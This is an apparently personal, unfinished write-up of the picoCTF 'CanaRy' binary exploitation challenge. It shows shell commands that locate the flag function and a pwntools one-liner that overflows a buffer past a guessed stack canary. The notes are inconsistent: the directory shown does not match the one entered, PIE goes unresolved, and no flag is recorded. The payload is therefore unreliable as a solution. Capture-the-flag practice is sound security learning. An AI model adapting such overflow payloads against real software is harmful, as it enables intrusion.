# AUR

CanaRy - Points: 300 - (Solves: 54)Binary Exploitation - Unsolved
Solve
Hints
This time we added a canary to detect buffer overflows. Can you still find a way to retreive the flag from this program located in /problems/canary_3_257a2a2061c96a7fb8326dbbc04d0328. Source.
Maybe there's a smart way to brute-force the canary?
Walkthrough: This video should show you how to do it. www.youtube.com/watch?v=4Eir5gsSIM8

***

2kofawsome@pico-2019-shell1:~$ cd /problems/canary_3_257a2a2061c96a7fb8326dbbc04d0328

2kofawsome@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ objdump -t vuln | grep flag
000007ed g     F .text  00000090              flag
but it is PIE?



Canary is 57Gh

Final payload:

python -c 'from pwn import * ;print "a"*32 + "57Gh" + p32(0x000007ed)*38'

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA57GhAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK57GhAAAABBBBCCCCDDDDAAAA




Flag:

picoCTF{}

